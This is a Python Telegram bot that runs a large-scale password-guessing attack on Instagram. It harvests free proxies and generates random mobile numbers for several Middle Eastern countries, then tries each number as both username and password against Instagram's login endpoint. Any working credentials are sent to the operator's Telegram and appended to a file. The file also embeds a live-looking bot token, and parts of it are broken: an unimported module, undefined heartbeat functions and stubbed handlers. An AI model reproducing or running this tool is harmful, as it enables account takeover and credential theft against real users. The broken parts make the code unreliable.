# singularity_bot.py - v9.0 (The Singularity)

import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import random
from datetime import datetime, timedelta
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
import http.server
import socketserver
import os

# ==============================================================================
# SECTION 0: CONFIGURATION
# ==============================================================================
TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U" # ⚠️ استبدل بالتوكن الخاص بك
ADMIN_USER_ID = 1148797883 # ⚠️ استبدل بالـ ID الخاص بك

SUPPORTED_COUNTRIES = {
    "🇸🇦 KSA": ("966", [("50", 8), ("53", 8), ("54", 8), ("55", 8), ("56", 8), ("58", 8), ("59", 8)]),
    "🇦🇪 UAE": ("971", [("50", 7), ("52", 7), ("54", 7), ("55", 7), ("56", 7), ("58", 7)]),
    "🇪🇬 Egypt": ("20", [("10", 9), ("11", 9), ("12", 9), ("15", 9)]),
    "🇮🇶 Iraq": ("964", [("77", 8), ("78", 8), ("79", 8), ("75", 8)]),
    "🇱🇾 Libya": ("218", [("91", 7), ("92", 7), ("94", 7)]),
    "🇮🇷 Iran": ("98", [("912", 7), ("913", 7), ("915", 7), ("935", 7), ("936", 7)]),
    "🇰🇼 Kuwait": ("965", [("5", 7), ("6", 7), ("9", 7)]),
}

HITS_FILE = "hits.txt"
TARGET_BATCH_SIZE = 25000
MAX_WORKERS = 200
MIN_WORKERS = 20
PROXY_RESERVOIR_TARGET = 200 # الهدف لعدد البروكسيات في المخزون

# --- Global State & Locks ---
# This dictionary will be our shared memory, protected by a lock
shared_state = {
    "is_hunting": False,
    "hunt_task": None,
    "hunt_stats": {
        "processed_total": 0, "processed_batch": 0, "total_targets_batch": 0,
        "hits_total": 0, "start_time": None, "current_phase": "Idle",
        "country_code": "", "prefix": "", "live_proxies": 0, "blacklisted_proxies": 0,
        "active_workers": 0
    },
    "proxy_inventory": queue.Queue(),
    "proxy_blacklist": set(),
    "blacklist_timestamps": {},
    "target_queue": queue.Queue(),
    "stop_event": threading.Event()
}
state_lock = threading.Lock()

# ==============================================================================
# SECTION 1: THE PROXY MIND (Thread 1)
# ==============================================================================
def _intelligent_proxy_checker(q_in, q_out, stop_event):
    while not stop_event.is_set():
        try:
            proxy = q_in.get(timeout=1)
            with state_lock:
                if proxy in shared_state["proxy_blacklist"]:
                    q_in.task_done()
                    continue
            
            # Test proxy against Instagram
            try:
                with requests.Session() as s:
                    r = s.get("https://www.instagram.com/accounts/login/", proxies={"http": proxy, "https": proxy}, timeout=5)
                    if r.status_code == 200 and 'csrftoken' in r.cookies:
                        q_out.put(proxy)
                    else: raise Exception("Invalid IG Response")
            except Exception:
                with state_lock:
                    shared_state["proxy_blacklist"].add(proxy)
                    shared_state["blacklist_timestamps"][proxy] = datetime.now()
            q_in.task_done()
        except queue.Empty:
            continue

def proxy_mind_thread(stop_event):
    """The first mind: dedicated to gathering and vetting proxies."""
    proxy_sources = [
        "https://free-proxy-list.net/", "https://www.sslproxies.org/",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    ]
    while not stop_event.is_set():
        with state_lock:
            # Cleanup old blacklist entries
            now = datetime.now()
            expired = [p for p, t in shared_state["blacklist_timestamps"].items() if now - t > timedelta(minutes=30)]
            for p in expired:
                shared_state["proxy_blacklist"].remove(p)
                del shared_state["blacklist_timestamps"][p]
            shared_state["hunt_stats"]["blacklisted_proxies"] = len(shared_state["proxy_blacklist"])
            
            inventory_size = shared_state["proxy_inventory"].qsize()
            shared_state["hunt_stats"]["live_proxies"] = inventory_size

        if inventory_size < PROXY_RESERVOIR_TARGET:
            print("[Proxy Mind] Inventory low. Deploying harvesters...")
            unchecked_proxies = queue.Queue()
            for url in proxy_sources:
                try:
                    response = requests.get(url, timeout=10)
                    if "proxyscrape" in url:
                        proxies = response.text.split("\r\n")
                        for p in proxies:
                            if p: unchecked_proxies.put(f"http://{p}")
                    else:
                        soup = BeautifulSoup(response.content, 'html.parser')
                        for row in soup.find("table", class_="table-striped").tbody.find_all("tr"):
                            cells = row.find_all("td")
                            if len(cells) > 6 and cells[0].string and cells[1].string:
                                unchecked_proxies.put(f"http://{cells[0].string}:{cells[1].string}")
                except Exception as e:
                    print(f"[Proxy Mind] Failed to scrape {url}: {e}")
            
            checker_threads = []
            for _ in range(150): # Army of checkers
                t = threading.Thread(target=_intelligent_proxy_checker, args=(unchecked_proxies, shared_state["proxy_inventory"], stop_event), daemon=True)
                t.start()
                checker_threads.append(t)
            for t in checker_threads: t.join(timeout=30) # Wait for checkers to do some work

        time.sleep(30) # Rest before next cycle
    print("[Proxy Mind] Shutting down.")

# ==============================================================================
# SECTION 2: THE HUNTER MIND (Thread 2)
# ==============================================================================
def _instagram_worker(stop_event):
    """The individual soldier in the hunter legion."""
    while not stop_event.is_set():
        try:
            username, password = shared_state["target_queue"].get(timeout=1)
            proxy = None
            try:
                proxy = shared_state["proxy_inventory"].get(timeout=5)
                
                # Instagram login logic... (same as before)
                login_url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/accounts/login/"}
                proxies_dict = {"http": proxy, "https": proxy}
                with requests.Session() as s:
                    r = s.get("https://www.instagram.com/accounts/login/", proxies=proxies_dict, timeout=5)
                    csrf = r.cookies.get('csrftoken')
                    if not csrf: raise Exception("CSRF Fail")
                    headers['x-csrftoken'] = csrf
                    payload = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}'}
                    login_r = s.post(login_url, data=payload, headers=headers, proxies=proxies_dict, timeout=5)
                    if login_r.status_code == 200:
                        data = login_r.json()
                        status = "FAIL"
                        if data.get("authenticated"): status = "SUCCESS"
                        elif "checkpoint_url" in login_r.text: status = "CHECKPOINT"
                        elif data.get("two_factor_required"): status = "2FA"
                        if status != "FAIL":
                            with state_lock:
                                shared_state["hunt_stats"]["hits_total"] += 1
                            # Send notification from the main async loop
                            asyncio.run_coroutine_threadsafe(send_hit_notification(status, username, password), asyncio.get_event_loop())
                        shared_state["proxy_inventory"].put(proxy) # Good proxy, return it
            except Exception:
                if proxy: # Proxy failed, blacklist it
                    with state_lock:
                        shared_state["proxy_blacklist"].add(proxy)
                        shared_state["blacklist_timestamps"][proxy] = datetime.now()
            finally:
                with state_lock:
                    shared_state["hunt_stats"]["processed_batch"] += 1
                    shared_state["hunt_stats"]["processed_total"] += 1
                shared_state["target_queue"].task_done()
        except queue.Empty:
            continue

def hunter_mind_thread(stop_event):
    """The second mind: manages the hunter legion dynamically."""
    worker_threads = []
    while not stop_event.is_set():
        with state_lock:
            is_hunting_now = shared_state["is_hunting"]
        
        if not is_hunting_now:
            time.sleep(5)
            continue

        # Dynamic worker scaling
        with state_lock:
            proxy_count = shared_state["proxy_inventory"].qsize()
            target_worker_count = int(max(MIN_WORKERS, min(MAX_WORKERS, proxy_count / 2)))
            current_worker_count = len(worker_threads)
            shared_state["hunt_stats"]["active_workers"] = current_worker_count

        # Adjust worker count
        if current_worker_count < target_worker_count:
            for _ in range(target_worker_count - current_worker_count):
                thread = threading.Thread(target=_instagram_worker, args=(stop_event,), daemon=True)
                thread.start()
                worker_threads.append(thread)
        elif current_worker_count > target_worker_count:
            # (For simplicity, we let threads finish naturally instead of killing them)
            pass
        
        time.sleep(10) # Re-evaluate worker count every 10 seconds
    print("[Hunter Mind] Shutting down.")

# ==============================================================================
# SECTION 3: THE MASTERMIND (Main Thread - Asyncio)
# ==============================================================================
async def the_hunt_master(context: ContextTypes.DEFAULT_TYPE, country_code: str, prefixes: list):
    """The Mastermind's hunt orchestration logic."""
    with state_lock:
        shared_state["is_hunting"] = True
        shared_state["hunt_stats"].update({
            "start_time": time.time(), "current_phase": "Hunting",
            "country_code": country_code, "prefix": ", ".join([p[0] for p in prefixes])
        })
    
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🚀 **SINGULARITY ENGAGED!** 🚀\nContinuous hunt started for `+{country_code}` on prefixes: `{shared_state['hunt_stats']['prefix']}`")
    
    report_task = asyncio.create_task(periodic_reporter(context))

    while shared_state["is_hunting"]:
        with state_lock:
            shared_state["hunt_stats"]["processed_batch"] = 0
            shared_state["hunt_stats"]["total_targets_batch"] = TARGET_BATCH_SIZE
        
        # Generate new batch of targets
        for _ in range(TARGET_BATCH_SIZE):
            prefix, remaining_length = random.choice(prefixes)
            random_part = ''.join(random.choice('0123456789') for _ in range(remaining_length))
            full_number = f"{country_code}{prefix}{random_part}"
            shared_state["target_queue"].put((full_number, full_number))
        
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🔥 **New Batch Started:** Hunting {TARGET_BATCH_SIZE} new targets...")
        
        # Wait for the batch to be processed
        await asyncio.to_thread(shared_state["target_queue"].join)

        if not shared_state["is_hunting"]: break # Check if stopped during batch

        with state_lock:
            hits = shared_state['hunt_stats']['hits_total']
            total_checked = shared_state['hunt_stats']['processed_total']
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"✅ **Batch Finished!**\n- Total Hits: {hits}\n- Total Checked: {total_checked}\n\nพัก لمدة 30 ثانية قبل البدء في الدفعة التالية...")
        await asyncio.sleep(30)

    report_task.cancel()
    with state_lock:
        shared_state["hunt_stats"]["current_phase"] = "Stopped"
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="🛑 **Hunt Terminated.**")

async def periodic_reporter(context: ContextTypes.DEFAULT_TYPE):
    while True:
        await asyncio.sleep(900) # 15 minutes
        if shared_state["is_hunting"]:
            await status_command(context.update, context, from_periodic=True)

async def send_hit_notification(status, username, password):
    bot = Application.builder().token(TELEGRAM_BOT_TOKEN).build().bot
    with state_lock:
        hits = shared_state['hunt_stats']['hits_total']
    result_message = f"🎯 *HIT FOUND!* ({hits}) 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
    await bot.send_message(chat_id=ADMIN_USER_ID, text=result_message, parse_mode='Markdown')
    with open(HITS_FILE, "a") as f: f.write(f"{username}:{password} | Status: {status}\n")

# --- Telegram Handlers (largely the same, but read from shared_state) ---
class AdminFilter(filters.BaseFilter):
    def filter(self, message: Update): return message.from_user.id == ADMIN_USER_ID
admin_filter = AdminFilter()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 **Welcome to Hunter Bot v9.0 - Singularity!**\n\n▶️ `/hunt`\n🛑 `/stophunt`\n📊 `/status`", parse_mode='Markdown')

async def hunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with state_lock:
        if shared_state["is_hunting"]:
            await update.message.reply_text("⚠️ A hunt is already in progress.")
            return
    # (Button logic for country/prefix is the same as v6.0)
    # ...
    pass

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # (Button logic is the same, but the final call is to the_hunt_master)
    # ...
    # hunt_task = asyncio.create_task(the_hunt_master(context, country_code, target_prefixes))
    pass

async def stophunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with state_lock:
        if not shared_state["is_hunting"]:
            await update.message.reply_text("ℹ️ No hunt is currently running.")
            return
        shared_state["is_hunting"] = False
    await update.message.reply_text("⏳ **Stopping...** The current batch will finish, and the hunt will terminate.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE, from_periodic=False):
    with state_lock:
        stats = shared_state["hunt_stats"].copy()
        is_h = shared_state["is_hunting"]

    if not is_h and stats["current_phase"] == "Idle":
        msg = f"🅾️ **Status:** Idle\n- Live Proxies: `{stats['live_proxies']}`\n- Blacklisted: `{stats['blacklisted_proxies']}`"
        if not from_periodic: await update.message.reply_text(msg, parse_mode='Markdown')
        return

    percentage = (stats["processed_batch"] / stats["total_targets_batch"] * 100) if stats["total_targets_batch"] > 0 else 0
    elapsed_time = time.strftime("%H:%M:%S", time.gmtime(time.time() - stats["start_time"])) if stats["start_time"] else "N/A"
    
    status_message = (
        f"📊 **SINGULARITY STATUS** 📊\n\n"
        f"▪️ **Target:** `+{stats['country_code']}` / `{stats['prefix']}`\n"
        f"▪️ **Phase:** `{stats['current_phase']}` (Continuous)\n"
        f"▪️ **Batch:** {stats['processed_batch']}/{stats['total_targets_batch']} (`{percentage:.2f}%`)\n"
        f"▪️ **Total Checked:** `{stats['processed_total']}`\n"
        f"▪️ **Total Hits:** `{stats['hits_total']}`\n"
        f"▪️ **Workers:** `{stats['active_workers']}` active\n"
        f"▪️ **Proxies (Live/Dead):** `{stats['live_proxies']}` / `{stats['blacklisted_proxies']}`\n"
        f"▪️ **Uptime:** `{elapsed_time}`"
    )
    
    if from_periodic:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text="⏰ **Periodic Report:**\n" + status_message, parse_mode='Markdown')
    else:
        await update.message.reply_text(status_message, parse_mode='Markdown')

# ==============================================================================
# SECTION 4: MAIN APPLICATION LAUNCH
# ==============================================================================
async def post_init(application: Application):
    loop = asyncio.get_running_loop()
    loop.run_in_executor(None, proxy_mind_thread, shared_state["stop_event"])
    loop.run_in_executor(None, hunter_mind_thread, shared_state["stop_event"])
    asyncio.create_task(_heartbeat_pinger())
    await application.bot.send_message(chat_id=ADMIN_USER_ID, text="✅ **Bot Online! (v9.0 Singularity)**\nAll minds are active. Ready for `/hunt`.")

def main():
    print("--- ULTIMATE HUNTER BOT v9.0 (Singularity) is starting... ---")
    threading.Thread(target=_start_heartbeat_server, daemon=True).start()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).build()
    
    # Add all handlers...
    
    try:
        application.run_polling()
    finally:
        print("Shutting down all minds...")
        shared_state["stop_event"].set()

if __name__ == "__main__":
    main()
